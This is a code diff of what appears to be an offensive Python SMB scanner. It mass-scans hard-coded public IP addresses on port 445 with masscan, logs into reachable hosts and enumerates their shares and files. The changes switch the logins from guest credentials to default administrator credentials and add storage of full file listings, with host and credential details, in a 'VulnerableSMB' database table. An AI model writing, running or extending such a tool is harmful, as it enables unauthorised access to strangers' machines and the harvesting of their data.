@@ -21,7 +21,7 @@ end = '\033[0m'
 
 
 def get_pipe():
-    args = ['sudo', 'masscan', '193.106.132.46', '-p', '445', '--rate', '250', '--connection-timeout', '8']
+    args = ['masscan', '96.2.213.179', '-p', '445', '--rate', '250', '--connection-timeout', '8']
     process = Popen(args, stdout=PIPE)
     dialects = [785, 770, 768, 528, 514, 767]
 
@@ -50,7 +50,7 @@ def dumps_dir(ip, port, username, password, client, domain):
         conn.connect(ip, port, timeout=25)
         shares = conn.listShares(timeout=25)
         lib_dir = list()
-        string, all_files = '', ''
+        string = ''
         for i in range(len(shares)):
             lib_dir.append(shares[i].name)
         for x in lib_dir:
@@ -58,11 +58,18 @@ def dumps_dir(ip, port, username, password, client, domain):
                 conn.listPath(x, '/')
                 a_ = conn.listPath(x, '/', search=65591, pattern='*', timeout=20)
                 lib_dir_v2 = list()
+                all_files = ''
+
                 for files in a_:
                     lib_dir_v2.append(files.filename)
                 print(f'{green}[+]{end} [{ip}] : {x} : {lib_dir_v2[2:5]} : More info on a host')
+
+                for file in lib_dir_v2[2:]:
+                    all_files += str(file)
+                    all_files += '/'
+
                 # Adding all opened dirs and files
-                AddHosts().appendHostPostgreSQL('VulnerableSMB', ip, port, username, password, str(x))
+                AddHosts().appendHostPostgreSQL('VulnerableSMB', ip, port, username, password, str(x), all_files)
             except OperationFailure:
                 print(f'{fail}[-]{end} [{ip}] : Authentication aborted on {x} ')
                 pass
@@ -100,7 +107,7 @@ def smb_checker(host, port, timeout, dialects_int):
             if success != '':
                 count[y] += 1
                 print(f'{green}[+]\t{end} [{x}] \t[0] : {conn}, Dialect version: {y}')
-                dumps_dir(str(host), port, 'User', 'User', 'Guest', '.')
+                dumps_dir(str(host), port, 'Admin', 'Admin', 'Administrator', '.')
                 break
 
         except (ValueError, TypeError) as err:
